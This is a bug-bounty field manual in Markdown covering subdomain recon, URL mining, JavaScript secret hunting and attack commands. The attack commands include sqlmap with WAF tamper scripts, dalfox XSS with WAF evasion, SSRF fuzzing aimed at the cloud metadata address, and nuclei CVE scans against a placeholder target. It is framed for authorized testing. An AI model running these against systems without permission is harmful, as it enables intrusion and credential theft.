# 🏹 The Hunter's Arsenal
### *A Recon-to-Exploit Field Manual*

> *"Every subdomain is a door. Every parameter is a question. Your job is to knock on all of them — and listen for the ones that answer wrong."*

---

## ⚠️ Rules of Engagement
Before a single command runs:
- ✅ Target is **in scope**, confirmed against the program's policy
- ✅ You have permission to scan/fuzz (no blind SQLi/DoS on out-of-scope rate limits)
- ✅ Replace every `target.com` below with your real target
- ✅ Go slow, go quiet — `-rl` (rate-limit) flags exist for a reason

---

## 🌐 Phase I — The Mapmaker
*Before you can hunt, you must know the forest.*

### 🔍 Subdomain Enumeration — Casting the Net
```bash
subfinder -d target.com -all -recursive -silent -o sub1.txt
amass enum -active -d target.com -o sub2.txt
assetfinder --subs-only target.com >> sub2.txt
cat sub1.txt sub2.txt | anew all_subs.txt
```
*Three engines, one net. What slips past one, another catches.*

### 🧬 Permutation & Resolution — Finding the Ghosts
```bash
dnsgen all_subs.txt | massdns -r resolvers.txt -t A -o S -w resolved.txt
puredns resolve all_subs.txt -r resolvers.txt --write resolved_valid.txt
```
*Mutate the known to find the hidden. `dev-01` often lives beside `dev`.*

### 📡 Live Host Probing — Who's Actually Breathing
```bash
httpx -l resolved_valid.txt -title -tech-detect -status-code -cl -location \
  -favicon -jarm -cdn -ip -o live_hosts.txt
```
*A subdomain is just a name. This tells you who's home — and what they're running.*

### 🛰️ ASN / IP Discovery — Mapping the Whole Territory
```bash
asnmap -d target.com | naabu -silent -top-ports 1000 -o ports.txt
```
*Wide-scope programs hide assets outside DNS entirely. This finds the neighborhood, not just the house.*

---

## 🕸️ Phase II — The Archaeologist
*URLs are fossils. Dig through time to find what still works today.*

```bash
gau --threads 20 target.com | anew urls.txt
waybackurls target.com | anew urls.txt
katana -u live_hosts.txt -d 5 -jc -kf all -fx -o crawl.txt
```
*The Wayback Machine remembers what the devs forgot to delete.*

### 🎯 Parameter Mining — Sorting the Ammo
```bash
gf xss urls.txt > xss_candidates.txt
gf sqli urls.txt > sqli_candidates.txt
gf ssrf urls.txt > ssrf_candidates.txt
gf idor urls.txt > idor_candidates.txt
```
*Not every URL is a bullet. `gf` sorts the duds from the live rounds.*

---

## 🧠 Phase III — The Codebreaker
*JavaScript talks. You just have to listen closely.*

```bash
subjs < live_hosts.txt | tee js_files.txt
cat js_files.txt | nuclei -t exposures/ -o js_secrets.txt
python3 SecretFinder.py -i js_files.txt -o cli
python3 LinkFinder.py -i js_files.txt -o endpoints.html
```
*API keys, hidden endpoints, forgotten admin panels — frontend bundles are confession booths.*

---

## 💣 Phase IV — The Breach
*This is where recon becomes revenue.*

### 🌊 SSRF — Making the Server Call Home (to You)
```bash
interactsh-client
ffuf -u "https://target.com/fetch?url=FUZZ" -w ssrf_payloads.txt
```
*If the server fetches a URL for you, ask it to fetch `169.254.169.254` instead.*

### 💉 SQL Injection — Speaking the Database's Native Tongue
```bash
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 \
  --tamper=space2comment,charencode --technique=BT
```
*WAF in the way? `--tamper` is how you change your accent, not your message.*

### ⚡ XSS — Finding Where Input Becomes Output
```bash
dalfox file urls.txt --deep-domxss --waf-evasion -o xss_results.txt
```
*Somewhere, user input is being trusted. DOM XSS is where the browser does your dirty work.*

### 🔮 GraphQL — Interrogating the Schema
```bash
graphql-cop -t https://target.com/graphql
clairvoyance -o schema.json -u https://target.com/graphql
```
*Introspection disabled? `clairvoyance` brute-forces the schema back into existence.*

### 🧩 Mass Assignment & BOLA — Testing the Locks
```bash
arjun -u https://target.com/api/v1/user -m POST
kiterunner scan https://target.com -w routes-large.kite
```
*Every API has routes nobody documented. `kiterunner` finds the ones they forgot to lock.*

---

## 🛡️ Phase V — The Sweep
*The automated net, cast last — correlation, not discovery.*

```bash
nuclei -l live_hosts.txt -t cves/ -t exposures/ -t misconfiguration/ \
  -severity medium,high,critical -rl 15 -c 25 -o nuclei_results.txt
```
*Known CVEs, exposed `.git` folders, leaked `.env` files — the low-hanging fruit, picked last so it doesn't blind you to the real find.*

---

## 📜 The Hunter's Code
1. **One target, one bug class per session.** Chasing everything catches nothing.
2. **Chain small bugs.** An open redirect + SSRF + info leak can outpay a single critical.
3. **Log everything** — target, hypothesis, result. Memory lies; notes don't.
4. **Severity before submission.** Not every IDOR is a P1 — but chained, it might be.
5. **Quiet hands.** Rate-limit your scans. A banned account earns nothing.

---

*Scope respected. Evidence minimal. Impact maximum.* 🎯
